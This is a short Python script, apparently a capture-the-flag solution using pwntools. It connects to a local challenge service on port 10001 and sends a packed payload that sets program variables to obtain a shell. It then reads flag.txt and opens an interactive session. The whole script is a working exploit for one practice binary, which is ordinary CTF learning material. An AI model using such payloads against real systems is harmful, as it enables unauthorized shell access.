from pwn import *


p=remote("localhost",10001)


p.sendline(p64(0x69)+p32(0)*4)  #a=0x69 - b,c,d,e =0

# i got my shell now i get the flag
p.sendline("cat flag.txt")

p.interactive()